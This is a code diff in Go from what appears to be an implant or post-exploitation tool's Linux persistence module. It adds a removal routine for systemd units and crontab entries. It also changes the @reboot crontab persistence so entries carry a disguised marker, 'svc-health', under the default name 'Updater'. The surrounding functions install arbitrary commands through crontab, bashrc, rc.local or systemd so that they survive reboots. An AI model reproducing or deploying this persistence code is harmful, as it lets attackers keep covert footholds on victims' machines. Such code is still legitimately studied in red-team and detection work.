@@ -22,15 +22,62 @@ func persistMethod(method, cmd, name string) (string, error) {
 		return persistRCLocal(cmd, name)
 	case "systemd", "service":
 		return persistSystemd(cmd, name)
+	case "rm", "remove", "uninstall":
+		return persistRemoveLinux(name)
 	default:
 		return "", fmt.Errorf("unknown persistence method: %s (linux: crontab|bashrc|rc.local|systemd)", method)
 	}
 }
 
-func persistCrontab(cmd, _ string) (string, error) {
+func persistRemoveLinux(name string) (string, error) {
+	if name == "" {
+		name = "Updater"
+	}
+	var removed []string
+
+	// Remove the user systemd unit, if present.
+	home, _ := os.UserHomeDir()
+	unit := filepath.Join(home, ".config", "systemd", "user", name+".service")
+	if err := os.Remove(unit); err == nil {
+		_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
+		removed = append(removed, "systemd unit removed: "+name)
+	}
+
+	// Remove the marker line installed by persistCrontab. Do not rewrite the
+	// crontab when it cannot be read or when no managed entry is present.
+	if existing, err := exec.Command("crontab", "-l").Output(); err == nil {
+		lines := strings.Split(string(existing), "\n")
+		kept := lines[:0]
+		for _, line := range lines {
+			if strings.Contains(line, "# svc-health:"+name) ||
+				(strings.Contains(line, "# svc-health") && name == "Updater") {
+				continue
+			}
+			kept = append(kept, line)
+		}
+		updated := strings.Join(kept, "\n")
+		if updated != string(existing) {
+			c := exec.Command("crontab", "-")
+			c.Stdin = strings.NewReader(updated)
+			if err := c.Run(); err == nil {
+				removed = append(removed, "crontab entry removed: "+name)
+			}
+		}
+	}
+
+	if len(removed) == 0 {
+		return "", fmt.Errorf("no persistence entries found for name: %s", name)
+	}
+	return "[+] " + strings.Join(removed, "\n[+] "), nil
+}
+
+func persistCrontab(cmd, name string) (string, error) {
 	// Add @reboot entry via crontab -l | crontab -
 	existing, _ := exec.Command("crontab", "-l").Output()
-	entry := fmt.Sprintf("@reboot %s\n", cmd)
+	if name == "" {
+		name = "Updater"
+	}
+	entry := fmt.Sprintf("@reboot %s # svc-health:%s\n", cmd, name)
 	if strings.Contains(string(existing), cmd) {
 		return "already in crontab", nil
 	}
